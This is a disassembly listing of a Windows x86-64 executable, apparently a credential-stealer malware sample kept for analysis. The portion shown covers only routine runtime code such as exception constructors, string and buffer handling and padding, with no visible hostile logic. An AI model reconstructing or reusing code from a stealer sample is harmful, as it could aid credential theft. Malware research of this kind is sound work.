
malware_samples/stealer/5b51a3b3a5b1e7b5f6d99eb599872fb0f15cd7a38cd6c0d3d34e6f39018f0b03.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140001000 <.text>:
   140001000:	48 83 ec 28          	sub    $0x28,%rsp
   140001004:	48 8d 0d 05 a3 03 00 	lea    0x3a305(%rip),%rcx        # 0x14003b310
   14000100b:	e8 34 67 00 00       	call   0x140007744
   140001010:	48 8d 0d 99 6d 02 00 	lea    0x26d99(%rip),%rcx        # 0x140027db0
   140001017:	48 83 c4 28          	add    $0x28,%rsp
   14000101b:	e9 c4 79 00 00       	jmp    0x1400089e4
   140001020:	48 8d 0d 95 6d 02 00 	lea    0x26d95(%rip),%rcx        # 0x140027dbc
   140001027:	e9 b8 79 00 00       	jmp    0x1400089e4
   14000102c:	48 8d 0d e1 6d 02 00 	lea    0x26de1(%rip),%rcx        # 0x140027e14
   140001033:	e9 ac 79 00 00       	jmp    0x1400089e4
   140001038:	48 8d 0d 15 6e 02 00 	lea    0x26e15(%rip),%rcx        # 0x140027e54
   14000103f:	e9 a0 79 00 00       	jmp    0x1400089e4
   140001044:	48 83 ec 28          	sub    $0x28,%rsp
   140001048:	48 8d 0d 51 a5 03 00 	lea    0x3a551(%rip),%rcx        # 0x14003b5a0
   14000104f:	e8 f0 66 00 00       	call   0x140007744
   140001054:	48 8d 0d 39 6e 02 00 	lea    0x26e39(%rip),%rcx        # 0x140027e94
   14000105b:	48 83 c4 28          	add    $0x28,%rsp
   14000105f:	e9 80 79 00 00       	jmp    0x1400089e4
   140001064:	cc                   	int3
   140001065:	cc                   	int3
   140001066:	cc                   	int3
   140001067:	cc                   	int3
   140001068:	cc                   	int3
   140001069:	cc                   	int3
   14000106a:	cc                   	int3
   14000106b:	cc                   	int3
   14000106c:	cc                   	int3
   14000106d:	cc                   	int3
   14000106e:	cc                   	int3
   14000106f:	cc                   	int3
   140001070:	40 53                	rex push %rbx
   140001072:	48 83 ec 20          	sub    $0x20,%rsp
   140001076:	48 8b d9             	mov    %rcx,%rbx
   140001079:	48 8b c2             	mov    %rdx,%rax
   14000107c:	48 8d 0d a5 73 02 00 	lea    0x273a5(%rip),%rcx        # 0x140028428
   140001083:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001086:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   14000108a:	48 89 0b             	mov    %rcx,(%rbx)
   14000108d:	48 8d 48 08          	lea    0x8(%rax),%rcx
   140001091:	0f 11 02             	movups %xmm0,(%rdx)
   140001094:	e8 ef 8c 00 00       	call   0x140009d88
   140001099:	48 8b c3             	mov    %rbx,%rax
   14000109c:	48 83 c4 20          	add    $0x20,%rsp
   1400010a0:	5b                   	pop    %rbx
   1400010a1:	c3                   	ret
   1400010a2:	cc                   	int3
   1400010a3:	cc                   	int3
   1400010a4:	cc                   	int3
   1400010a5:	cc                   	int3
   1400010a6:	cc                   	int3
   1400010a7:	cc                   	int3
   1400010a8:	cc                   	int3
   1400010a9:	cc                   	int3
   1400010aa:	cc                   	int3
   1400010ab:	cc                   	int3
   1400010ac:	cc                   	int3
   1400010ad:	cc                   	int3
   1400010ae:	cc                   	int3
   1400010af:	cc                   	int3
   1400010b0:	48 8b 51 08          	mov    0x8(%rcx),%rdx
   1400010b4:	48 8d 05 8d 36 03 00 	lea    0x3368d(%rip),%rax        # 0x140034748
   1400010bb:	48 85 d2             	test   %rdx,%rdx
   1400010be:	48 0f 45 c2          	cmovne %rdx,%rax
   1400010c2:	c3                   	ret
   1400010c3:	cc                   	int3
   1400010c4:	cc                   	int3
   1400010c5:	cc                   	int3
   1400010c6:	cc                   	int3
   1400010c7:	cc                   	int3
   1400010c8:	cc                   	int3
   1400010c9:	cc                   	int3
   1400010ca:	cc                   	int3
   1400010cb:	cc                   	int3
   1400010cc:	cc                   	int3
   1400010cd:	cc                   	int3
   1400010ce:	cc                   	int3
   1400010cf:	cc                   	int3
   1400010d0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400010d5:	57                   	push   %rdi
   1400010d6:	48 83 ec 20          	sub    $0x20,%rsp
   1400010da:	48 8d 05 47 73 02 00 	lea    0x27347(%rip),%rax        # 0x140028428
   1400010e1:	48 8b f9             	mov    %rcx,%rdi
   1400010e4:	48 89 01             	mov    %rax,(%rcx)
   1400010e7:	8b da                	mov    %edx,%ebx
   1400010e9:	48 83 c1 08          	add    $0x8,%rcx
   1400010ed:	e8 1e 8d 00 00       	call   0x140009e10
   1400010f2:	f6 c3 01             	test   $0x1,%bl
   1400010f5:	74 0d                	je     0x140001104
   1400010f7:	ba 18 00 00 00       	mov    $0x18,%edx
   1400010fc:	48 8b cf             	mov    %rdi,%rcx
   1400010ff:	e8 10 74 00 00       	call   0x140008514
   140001104:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140001109:	48 8b c7             	mov    %rdi,%rax
   14000110c:	48 83 c4 20          	add    $0x20,%rsp
   140001110:	5f                   	pop    %rdi
   140001111:	c3                   	ret
   140001112:	cc                   	int3
   140001113:	cc                   	int3
   140001114:	cc                   	int3
   140001115:	cc                   	int3
   140001116:	cc                   	int3
   140001117:	cc                   	int3
   140001118:	cc                   	int3
   140001119:	cc                   	int3
   14000111a:	cc                   	int3
   14000111b:	cc                   	int3
   14000111c:	cc                   	int3
   14000111d:	cc                   	int3
   14000111e:	cc                   	int3
   14000111f:	cc                   	int3
   140001120:	48 8d 05 01 73 02 00 	lea    0x27301(%rip),%rax        # 0x140028428
   140001127:	48 89 01             	mov    %rax,(%rcx)
   14000112a:	48 83 c1 08          	add    $0x8,%rcx
   14000112e:	e9 dd 8c 00 00       	jmp    0x140009e10
   140001133:	cc                   	int3
   140001134:	cc                   	int3
   140001135:	cc                   	int3
   140001136:	cc                   	int3
   140001137:	cc                   	int3
   140001138:	cc                   	int3
   140001139:	cc                   	int3
   14000113a:	cc                   	int3
   14000113b:	cc                   	int3
   14000113c:	cc                   	int3
   14000113d:	cc                   	int3
   14000113e:	cc                   	int3
   14000113f:	cc                   	int3
   140001140:	48 8d 05 19 36 03 00 	lea    0x33619(%rip),%rax        # 0x140034760
   140001147:	48 c7 41 10 00 00 00 	movq   $0x0,0x10(%rcx)
   14000114e:	00 
   14000114f:	48 89 41 08          	mov    %rax,0x8(%rcx)
   140001153:	48 8d 05 f6 82 02 00 	lea    0x282f6(%rip),%rax        # 0x140029450
   14000115a:	48 89 01             	mov    %rax,(%rcx)
   14000115d:	48 8b c1             	mov    %rcx,%rax
   140001160:	c3                   	ret
   140001161:	cc                   	int3
   140001162:	cc                   	int3
   140001163:	cc                   	int3
   140001164:	cc                   	int3
   140001165:	cc                   	int3
   140001166:	cc                   	int3
   140001167:	cc                   	int3
   140001168:	cc                   	int3
   140001169:	cc                   	int3
   14000116a:	cc                   	int3
   14000116b:	cc                   	int3
   14000116c:	cc                   	int3
   14000116d:	cc                   	int3
   14000116e:	cc                   	int3
   14000116f:	cc                   	int3
   140001170:	48 83 ec 48          	sub    $0x48,%rsp
   140001174:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001179:	e8 c2 ff ff ff       	call   0x140001140
   14000117e:	48 8d 15 ab 7d 03 00 	lea    0x37dab(%rip),%rdx        # 0x140038f30
   140001185:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000118a:	e8 39 8e 00 00       	call   0x140009fc8
   14000118f:	cc                   	int3
   140001190:	40 53                	rex push %rbx
   140001192:	48 83 ec 20          	sub    $0x20,%rsp
   140001196:	48 8b d9             	mov    %rcx,%rbx
   140001199:	48 8b c2             	mov    %rdx,%rax
   14000119c:	48 8d 0d 85 72 02 00 	lea    0x27285(%rip),%rcx        # 0x140028428
   1400011a3:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400011a6:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   1400011aa:	48 89 0b             	mov    %rcx,(%rbx)
   1400011ad:	48 8d 48 08          	lea    0x8(%rax),%rcx
   1400011b1:	0f 11 02             	movups %xmm0,(%rdx)
   1400011b4:	e8 cf 8b 00 00       	call   0x140009d88
   1400011b9:	48 8d 05 90 82 02 00 	lea    0x28290(%rip),%rax        # 0x140029450
   1400011c0:	48 89 03             	mov    %rax,(%rbx)
   1400011c3:	48 8b c3             	mov    %rbx,%rax
   1400011c6:	48 83 c4 20          	add    $0x20,%rsp
   1400011ca:	5b                   	pop    %rbx
   1400011cb:	c3                   	ret
   1400011cc:	cc                   	int3
   1400011cd:	cc                   	int3
   1400011ce:	cc                   	int3
   1400011cf:	cc                   	int3
   1400011d0:	40 53                	rex push %rbx
   1400011d2:	48 83 ec 20          	sub    $0x20,%rsp
   1400011d6:	48 8b d9             	mov    %rcx,%rbx
   1400011d9:	48 8b c2             	mov    %rdx,%rax
   1400011dc:	48 8d 0d 45 72 02 00 	lea    0x27245(%rip),%rcx        # 0x140028428
   1400011e3:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400011e6:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   1400011ea:	48 89 0b             	mov    %rcx,(%rbx)
   1400011ed:	48 8d 48 08          	lea    0x8(%rax),%rcx
   1400011f1:	0f 11 02             	movups %xmm0,(%rdx)
   1400011f4:	e8 8f 8b 00 00       	call   0x140009d88
   1400011f9:	48 8d 05 40 72 02 00 	lea    0x27240(%rip),%rax        # 0x140028440
   140001200:	48 89 03             	mov    %rax,(%rbx)
   140001203:	48 8b c3             	mov    %rbx,%rax
   140001206:	48 83 c4 20          	add    $0x20,%rsp
   14000120a:	5b                   	pop    %rbx
   14000120b:	c3                   	ret
   14000120c:	cc                   	int3
   14000120d:	cc                   	int3
   14000120e:	cc                   	int3
   14000120f:	cc                   	int3
   140001210:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140001215:	56                   	push   %rsi
   140001216:	57                   	push   %rdi
   140001217:	41 57                	push   %r15
   140001219:	48 83 ec 20          	sub    $0x20,%rsp
   14000121d:	48 8b 59 08          	mov    0x8(%rcx),%rbx
   140001221:	48 8b fa             	mov    %rdx,%rdi
   140001224:	48 8b 01             	mov    (%rcx),%rax
   140001227:	4c 8b fb             	mov    %rbx,%r15
   14000122a:	4c 2b f8             	sub    %rax,%r15
   14000122d:	48 8b f1             	mov    %rcx,%rsi
   140001230:	49 3b d7             	cmp    %r15,%rdx
   140001233:	73 15                	jae    0x14000124a
   140001235:	48 03 c2             	add    %rdx,%rax
   140001238:	48 89 41 08          	mov    %rax,0x8(%rcx)
   14000123c:	48 8b 5c 24 58       	mov    0x58(%rsp),%rbx
   140001241:	48 83 c4 20          	add    $0x20,%rsp
   140001245:	41 5f                	pop    %r15
   140001247:	5f                   	pop    %rdi
   140001248:	5e                   	pop    %rsi
   140001249:	c3                   	ret
   14000124a:	0f 86 10 01 00 00    	jbe    0x140001360
   140001250:	48 8b 49 10          	mov    0x10(%rcx),%rcx
   140001254:	48 2b c8             	sub    %rax,%rcx
   140001257:	48 3b f9             	cmp    %rcx,%rdi
   14000125a:	0f 86 0e 01 00 00    	jbe    0x14000136e
   140001260:	48 bb ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rbx
   140001267:	ff ff 7f 
   14000126a:	48 3b fb             	cmp    %rbx,%rdi
   14000126d:	0f 87 21 01 00 00    	ja     0x140001394
   140001273:	48 8b d1             	mov    %rcx,%rdx
   140001276:	4c 89 74 24 50       	mov    %r14,0x50(%rsp)
   14000127b:	48 d1 ea             	shr    $1,%rdx
   14000127e:	48 8b c3             	mov    %rbx,%rax
   140001281:	48 2b c2             	sub    %rdx,%rax
   140001284:	48 3b c8             	cmp    %rax,%rcx
   140001287:	76 26                	jbe    0x1400012af
   140001289:	48 b9 26 00 00 00 00 	movabs $0x8000000000000026,%rcx
   140001290:	00 00 80 
   140001293:	e8 38 72 00 00       	call   0x1400084d0
   140001298:	48 85 c0             	test   %rax,%rax
   14000129b:	0f 84 98 00 00 00    	je     0x140001339
   1400012a1:	4c 8d 70 27          	lea    0x27(%rax),%r14
   1400012a5:	49 83 e6 e0          	and    $0xffffffffffffffe0,%r14
   1400012a9:	49 89 46 f8          	mov    %rax,-0x8(%r14)
   1400012ad:	eb 38                	jmp    0x1400012e7
   1400012af:	48 8d 1c 11          	lea    (%rcx,%rdx,1),%rbx
   1400012b3:	48 3b df             	cmp    %rdi,%rbx
   1400012b6:	48 0f 42 df          	cmovb  %rdi,%rbx
   1400012ba:	48 85 db             	test   %rbx,%rbx
   1400012bd:	75 05                	jne    0x1400012c4
   1400012bf:	45 33 f6             	xor    %r14d,%r14d
   1400012c2:	eb 23                	jmp    0x1400012e7
   1400012c4:	48 81 fb 00 10 00 00 	cmp    $0x1000,%rbx
   1400012cb:	72 0f                	jb     0x1400012dc
   1400012cd:	48 8d 4b 27          	lea    0x27(%rbx),%rcx
   1400012d1:	48 3b cb             	cmp    %rbx,%rcx
   1400012d4:	0f 86 c0 00 00 00    	jbe    0x14000139a
   1400012da:	eb b7                	jmp    0x140001293
   1400012dc:	48 8b cb             	mov    %rbx,%rcx
   1400012df:	e8 ec 71 00 00       	call   0x1400084d0
   1400012e4:	4c 8b f0             	mov    %rax,%r14
   1400012e7:	4c 8b c7             	mov    %rdi,%r8
   1400012ea:	4b 8d 0c 37          	lea    (%r15,%r14,1),%rcx
   1400012ee:	4d 2b c7             	sub    %r15,%r8
   1400012f1:	33 d2                	xor    %edx,%edx
   1400012f3:	e8 f8 55 02 00       	call   0x1400268f0
   1400012f8:	48 8b 16             	mov    (%rsi),%rdx
   1400012fb:	49 8b ce             	mov    %r14,%rcx
   1400012fe:	4c 8b 46 08          	mov    0x8(%rsi),%r8
   140001302:	4c 2b c2             	sub    %rdx,%r8
   140001305:	e8 36 4f 02 00       	call   0x140026240
   14000130a:	48 8b 06             	mov    (%rsi),%rax
   14000130d:	48 85 c0             	test   %rax,%rax
   140001310:	74 36                	je     0x140001348
   140001312:	48 8b 56 10          	mov    0x10(%rsi),%rdx
   140001316:	48 2b d0             	sub    %rax,%rdx
   140001319:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140001320:	72 1e                	jb     0x140001340
   140001322:	48 8b 48 f8          	mov    -0x8(%rax),%rcx
   140001326:	48 2b c1             	sub    %rcx,%rax
   140001329:	48 83 e8 08          	sub    $0x8,%rax
   14000132d:	48 83 f8 1f          	cmp    $0x1f,%rax
   140001331:	77 06                	ja     0x140001339
   140001333:	48 83 c2 27          	add    $0x27,%rdx
   140001337:	eb 0a                	jmp    0x140001343
   140001339:	b9 05 00 00 00       	mov    $0x5,%ecx
   14000133e:	cd 29                	int    $0x29
   140001340:	48 8b c8             	mov    %rax,%rcx
   140001343:	e8 cc 71 00 00       	call   0x140008514
   140001348:	4a 8d 04 37          	lea    (%rdi,%r14,1),%rax
   14000134c:	4c 89 36             	mov    %r14,(%rsi)
   14000134f:	48 89 46 08          	mov    %rax,0x8(%rsi)
   140001353:	49 8d 04 1e          	lea    (%r14,%rbx,1),%rax
   140001357:	4c 8b 74 24 50       	mov    0x50(%rsp),%r14
   14000135c:	48 89 46 10          	mov    %rax,0x10(%rsi)
   140001360:	48 8b 5c 24 58       	mov    0x58(%rsp),%rbx
   140001365:	48 83 c4 20          	add    $0x20,%rsp
   140001369:	41 5f                	pop    %r15
   14000136b:	5f                   	pop    %rdi
   14000136c:	5e                   	pop    %rsi
   14000136d:	c3                   	ret
   14000136e:	49 2b ff             	sub    %r15,%rdi
   140001371:	33 d2                	xor    %edx,%edx
   140001373:	4c 8b c7             	mov    %rdi,%r8
   140001376:	48 8b cb             	mov    %rbx,%rcx
   140001379:	e8 72 55 02 00       	call   0x1400268f0
   14000137e:	48 8d 04 1f          	lea    (%rdi,%rbx,1),%rax
   140001382:	48 8b 5c 24 58       	mov    0x58(%rsp),%rbx
   140001387:	48 89 46 08          	mov    %rax,0x8(%rsi)
   14000138b:	48 83 c4 20          	add    $0x20,%rsp
   14000138f:	41 5f                	pop    %r15
   140001391:	5f                   	pop    %rdi
   140001392:	5e                   	pop    %rsi
   140001393:	c3                   	ret
   140001394:	e8 07 00 00 00       	call   0x1400013a0
   140001399:	cc                   	int3
   14000139a:	e8 d1 fd ff ff       	call   0x140001170
   14000139f:	cc                   	int3
   1400013a0:	48 83 ec 28          	sub    $0x28,%rsp
   1400013a4:	48 8d 0d cd 33 03 00 	lea    0x333cd(%rip),%rcx        # 0x140034778
   1400013ab:	e8 4c 63 00 00       	call   0x1400076fc
   1400013b0:	cc                   	int3
   1400013b1:	cc                   	int3
   1400013b2:	cc                   	int3
   1400013b3:	cc                   	int3
   1400013b4:	cc                   	int3
   1400013b5:	cc                   	int3
   1400013b6:	cc                   	int3
   1400013b7:	cc                   	int3
   1400013b8:	cc                   	int3
   1400013b9:	cc                   	int3
   1400013ba:	cc                   	int3
   1400013bb:	cc                   	int3
   1400013bc:	cc                   	int3
   1400013bd:	cc                   	int3
   1400013be:	cc                   	int3
   1400013bf:	cc                   	int3
   1400013c0:	48 83 ec 28          	sub    $0x28,%rsp
   1400013c4:	48 8d 0d bd 33 03 00 	lea    0x333bd(%rip),%rcx        # 0x140034788
   1400013cb:	e8 2c 63 00 00       	call   0x1400076fc
   1400013d0:	cc                   	int3
   1400013d1:	cc                   	int3
   1400013d2:	cc                   	int3
   1400013d3:	cc                   	int3
   1400013d4:	cc                   	int3
   1400013d5:	cc                   	int3
   1400013d6:	cc                   	int3
   1400013d7:	cc                   	int3
   1400013d8:	cc                   	int3
   1400013d9:	cc                   	int3
   1400013da:	cc                   	int3
   1400013db:	cc                   	int3
   1400013dc:	cc                   	int3
   1400013dd:	cc                   	int3
   1400013de:	cc                   	int3
   1400013df:	cc                   	int3
   1400013e0:	40 53                	rex push %rbx
   1400013e2:	48 83 ec 20          	sub    $0x20,%rsp
   1400013e6:	48 8b d9             	mov    %rcx,%rbx
   1400013e9:	48 8b c2             	mov    %rdx,%rax
   1400013ec:	48 8d 0d 35 70 02 00 	lea    0x27035(%rip),%rcx        # 0x140028428
   1400013f3:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400013f6:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   1400013fa:	48 89 0b             	mov    %rcx,(%rbx)
   1400013fd:	48 8d 48 08          	lea    0x8(%rax),%rcx
   140001401:	0f 11 02             	movups %xmm0,(%rdx)
   140001404:	e8 7f 89 00 00       	call   0x140009d88
   140001409:	48 8d 05 88 70 02 00 	lea    0x27088(%rip),%rax        # 0x140028498
   140001410:	48 89 03             	mov    %rax,(%rbx)
   140001413:	48 8b c3             	mov    %rbx,%rax
   140001416:	48 83 c4 20          	add    $0x20,%rsp
   14000141a:	5b                   	pop    %rbx
   14000141b:	c3                   	ret
   14000141c:	cc                   	int3
   14000141d:	cc                   	int3
   14000141e:	cc                   	int3
   14000141f:	cc                   	int3
   140001420:	44 89 02             	mov    %r8d,(%rdx)
   140001423:	48 8b c2             	mov    %rdx,%rax
   140001426:	48 89 4a 08          	mov    %rcx,0x8(%rdx)
   14000142a:	c3                   	ret
   14000142b:	cc                   	int3
   14000142c:	cc                   	int3
   14000142d:	cc                   	int3
   14000142e:	cc                   	int3
   14000142f:	cc                   	int3
   140001430:	40 53                	rex push %rbx
   140001432:	48 83 ec 30          	sub    $0x30,%rsp
   140001436:	48 8b 01             	mov    (%rcx),%rax
   140001439:	49 8b d8             	mov    %r8,%rbx
   14000143c:	44 8b c2             	mov    %edx,%r8d
   14000143f:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140001444:	ff 50 18             	call   *0x18(%rax)
   140001447:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   14000144b:	4c 8b 48 08          	mov    0x8(%rax),%r9
   14000144f:	48 8b 51 08          	mov    0x8(%rcx),%rdx
   140001453:	49 39 51 08          	cmp    %rdx,0x8(%r9)
   140001457:	75 0e                	jne    0x140001467
   140001459:	8b 0b                	mov    (%rbx),%ecx
   14000145b:	39 08                	cmp    %ecx,(%rax)
   14000145d:	75 08                	jne    0x140001467
   14000145f:	b0 01                	mov    $0x1,%al
   140001461:	48 83 c4 30          	add    $0x30,%rsp
   140001465:	5b                   	pop    %rbx
   140001466:	c3                   	ret
   140001467:	32 c0                	xor    %al,%al
   140001469:	48 83 c4 30          	add    $0x30,%rsp
   14000146d:	5b                   	pop    %rbx
   14000146e:	c3                   	ret
   14000146f:	cc                   	int3
   140001470:	48 8b 42 08          	mov    0x8(%rdx),%rax
   140001474:	4c 8b 48 08          	mov    0x8(%rax),%r9
   140001478:	4c 39 49 08          	cmp    %r9,0x8(%rcx)
   14000147c:	75 08                	jne    0x140001486
   14000147e:	44 39 02             	cmp    %r8d,(%rdx)
   140001481:	75 03                	jne    0x140001486
   140001483:	b0 01                	mov    $0x1,%al
   140001485:	c3                   	ret
   140001486:	32 c0                	xor    %al,%al
   140001488:	c3                   	ret
   140001489:	cc                   	int3
   14000148a:	cc                   	int3
   14000148b:	cc                   	int3
   14000148c:	cc                   	int3
   14000148d:	cc                   	int3
   14000148e:	cc                   	int3
   14000148f:	cc                   	int3
   140001490:	48 8d 05 49 98 03 00 	lea    0x39849(%rip),%rax        # 0x14003ace0
   140001497:	89 11                	mov    %edx,(%rcx)
   140001499:	48 89 41 08          	mov    %rax,0x8(%rcx)
   14000149d:	48 8b c1             	mov    %rcx,%rax
   1400014a0:	c3                   	ret
   1400014a1:	cc                   	int3
   1400014a2:	cc                   	int3
   1400014a3:	cc                   	int3
   1400014a4:	cc                   	int3
   1400014a5:	cc                   	int3
   1400014a6:	cc                   	int3
   1400014a7:	cc                   	int3
   1400014a8:	cc                   	int3
   1400014a9:	cc                   	int3
   1400014aa:	cc                   	int3
   1400014ab:	cc                   	int3
   1400014ac:	cc                   	int3
   1400014ad:	cc                   	int3
   1400014ae:	cc                   	int3
   1400014af:	cc                   	int3
   1400014b0:	40 55                	rex push %rbp
   1400014b2:	53                   	push   %rbx
   1400014b3:	56                   	push   %rsi
   1400014b4:	57                   	push   %rdi
   1400014b5:	41 54                	push   %r12
   1400014b7:	41 56                	push   %r14
   1400014b9:	41 57                	push   %r15
   1400014bb:	48 8d 6c 24 d9       	lea    -0x27(%rsp),%rbp
   1400014c0:	48 81 ec a0 00 00 00 	sub    $0xa0,%rsp
   1400014c7:	48 8b 05 b2 8b 03 00 	mov    0x38bb2(%rip),%rax        # 0x14003a080
   1400014ce:	48 33 c4             	xor    %rsp,%rax
   1400014d1:	48 89 45 17          	mov    %rax,0x17(%rbp)
   1400014d5:	49 8b f0             	mov    %r8,%rsi
   1400014d8:	4c 8b fa             	mov    %rdx,%r15
   1400014db:	4c 8b f1             	mov    %rcx,%r14
   1400014de:	48 89 4d 07          	mov    %rcx,0x7(%rbp)
   1400014e2:	45 33 e4             	xor    %r12d,%r12d
   1400014e5:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400014e8:	0f 11 45 a7          	movups %xmm0,-0x59(%rbp)
   1400014ec:	4c 89 65 b7          	mov    %r12,-0x49(%rbp)
   1400014f0:	4c 89 65 bf          	mov    %r12,-0x41(%rbp)
   1400014f4:	49 8b 78 10          	mov    0x10(%r8),%rdi
   1400014f8:	49 83 78 18 0f       	cmpq   $0xf,0x18(%r8)
   1400014fd:	76 03                	jbe    0x140001502
   1400014ff:	49 8b 30             	mov    (%r8),%rsi
   140001502:	48 bb ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rbx
   140001509:	ff ff 7f 
   14000150c:	48 3b fb             	cmp    %rbx,%rdi
   14000150f:	0f 87 21 02 00 00    	ja     0x140001736
   140001515:	48 83 ff 0f          	cmp    $0xf,%rdi
   140001519:	77 18                	ja     0x140001533
   14000151b:	48 89 7d b7          	mov    %rdi,-0x49(%rbp)
   14000151f:	48 c7 45 bf 0f 00 00 	movq   $0xf,-0x41(%rbp)
   140001526:	00 
   140001527:	0f 10 06             	movups (%rsi),%xmm0
   14000152a:	0f 11 45 a7          	movups %xmm0,-0x59(%rbp)
   14000152e:	e9 91 00 00 00       	jmp    0x1400015c4
   140001533:	48 8b c7             	mov    %rdi,%rax
   140001536:	48 83 c8 0f          	or     $0xf,%rax
   14000153a:	48 3b c3             	cmp    %rbx,%rax
   14000153d:	76 2c                	jbe    0x14000156b
   14000153f:	48 b8 27 00 00 00 00 	movabs $0x8000000000000027,%rax
   140001546:	00 00 80 
   140001549:	48 8b c8             	mov    %rax,%rcx
   14000154c:	e8 7f 6f 00 00       	call   0x1400084d0
   140001551:	48 8b c8             	mov    %rax,%rcx
   140001554:	48 85 c0             	test   %rax,%rax
   140001557:	0f 84 96 01 00 00    	je     0x1400016f3
   14000155d:	48 83 c0 27          	add    $0x27,%rax
   140001561:	48 83 e0 e0          	and    $0xffffffffffffffe0,%rax
   140001565:	48 89 48 f8          	mov    %rcx,-0x8(%rax)
   140001569:	eb 3a                	jmp    0x1400015a5
   14000156b:	48 8b d8             	mov    %rax,%rbx
   14000156e:	b9 16 00 00 00       	mov    $0x16,%ecx
   140001573:	48 3b c1             	cmp    %rcx,%rax
   140001576:	48 0f 42 d9          	cmovb  %rcx,%rbx
   14000157a:	48 8d 4b 01          	lea    0x1(%rbx),%rcx
   14000157e:	48 85 c9             	test   %rcx,%rcx
   140001581:	75 05                	jne    0x140001588
   140001583:	49 8b c4             	mov    %r12,%rax
   140001586:	eb 1d                	jmp    0x1400015a5
   140001588:	48 81 f9 00 10 00 00 	cmp    $0x1000,%rcx
   14000158f:	72 0f                	jb     0x1400015a0
   140001591:	48 8d 41 27          	lea    0x27(%rcx),%rax
   140001595:	48 3b c1             	cmp    %rcx,%rax
   140001598:	0f 86 9e 01 00 00    	jbe    0x14000173c
   14000159e:	eb a9                	jmp    0x140001549
   1400015a0:	e8 2b 6f 00 00       	call   0x1400084d0
   1400015a5:	48 89 45 a7          	mov    %rax,-0x59(%rbp)
   1400015a9:	48 89 7d b7          	mov    %rdi,-0x49(%rbp)
   1400015ad:	48 89 5d bf          	mov    %rbx,-0x41(%rbp)
   1400015b1:	4c 8d 47 01          	lea    0x1(%rdi),%r8
   1400015b5:	48 8b d6             	mov    %rsi,%rdx
   1400015b8:	48 8b c8             	mov    %rax,%rcx
   1400015bb:	e8 80 4c 02 00       	call   0x140026240
   1400015c0:	48 8b 7d b7          	mov    -0x49(%rbp),%rdi
   1400015c4:	48 8d 45 a7          	lea    -0x59(%rbp),%rax
   1400015c8:	48 89 45 07          	mov    %rax,0x7(%rbp)
   1400015cc:	49 8b 5f 08          	mov    0x8(%r15),%rbx
   1400015d0:	48 85 ff             	test   %rdi,%rdi
   1400015d3:	74 16                	je     0x1400015eb
   1400015d5:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   1400015db:	48 8d 15 b6 31 03 00 	lea    0x331b6(%rip),%rdx        # 0x140034798
   1400015e2:	48 8d 4d a7          	lea    -0x59(%rbp),%rcx
   1400015e6:	e8 a5 3f 00 00       	call   0x140005590
   1400015eb:	48 8b 03             	mov    (%rbx),%rax
   1400015ee:	45 8b 07             	mov    (%r15),%r8d
   1400015f1:	48 8d 55 c7          	lea    -0x39(%rbp),%rdx
   1400015f5:	48 8b cb             	mov    %rbx,%rcx
   1400015f8:	ff 50 10             	call   *0x10(%rax)
   1400015fb:	90                   	nop
   1400015fc:	48 8d 55 c7          	lea    -0x39(%rbp),%rdx
   140001600:	48 83 7d df 0f       	cmpq   $0xf,-0x21(%rbp)
   140001605:	48 0f 47 55 c7       	cmova  -0x39(%rbp),%rdx
   14000160a:	4c 8b 45 d7          	mov    -0x29(%rbp),%r8
   14000160e:	48 8d 4d a7          	lea    -0x59(%rbp),%rcx
   140001612:	e8 79 3f 00 00       	call   0x140005590
   140001617:	90                   	nop
   140001618:	48 8b 55 df          	mov    -0x21(%rbp),%rdx
   14000161c:	48 83 fa 0f          	cmp    $0xf,%rdx
   140001620:	76 36                	jbe    0x140001658
   140001622:	48 8b 45 c7          	mov    -0x39(%rbp),%rax
   140001626:	48 ff c2             	inc    %rdx
   140001629:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140001630:	72 1e                	jb     0x140001650
   140001632:	48 8b 48 f8          	mov    -0x8(%rax),%rcx
   140001636:	48 2b c1             	sub    %rcx,%rax
   140001639:	48 83 e8 08          	sub    $0x8,%rax
   14000163d:	48 83 f8 1f          	cmp    $0x1f,%rax
   140001641:	77 06                	ja     0x140001649
   140001643:	48 83 c2 27          	add    $0x27,%rdx
   140001647:	eb 0a                	jmp    0x140001653
   140001649:	b9 05 00 00 00       	mov    $0x5,%ecx
   14000164e:	cd 29                	int    $0x29
   140001650:	48 8b c8             	mov    %rax,%rcx
   140001653:	e8 bc 6e 00 00       	call   0x140008514
   140001658:	0f 10 4d a7          	movups -0x59(%rbp),%xmm1
   14000165c:	0f 11 4d e7          	movups %xmm1,-0x19(%rbp)
   140001660:	0f 10 45 b7          	movups -0x49(%rbp),%xmm0
   140001664:	0f 11 45 f7          	movups %xmm0,-0x9(%rbp)
   140001668:	4c 89 65 b7          	mov    %r12,-0x49(%rbp)
   14000166c:	48 c7 45 bf 0f 00 00 	movq   $0xf,-0x41(%rbp)
   140001673:	00 
   140001674:	c6 45 a7 00          	movb   $0x0,-0x59(%rbp)
   140001678:	66 0f 73 d8 08       	psrldq $0x8,%xmm0
   14000167d:	66 48 0f 7e c1       	movq   %xmm0,%rcx
   140001682:	4c 8d 45 e7          	lea    -0x19(%rbp),%r8
   140001686:	66 48 0f 7e c8       	movq   %xmm1,%rax
   14000168b:	48 83 f9 0f          	cmp    $0xf,%rcx
   14000168f:	4c 0f 47 c0          	cmova  %rax,%r8
   140001693:	48 8d 05 8e 6d 02 00 	lea    0x26d8e(%rip),%rax        # 0x140028428
   14000169a:	49 89 06             	mov    %rax,(%r14)
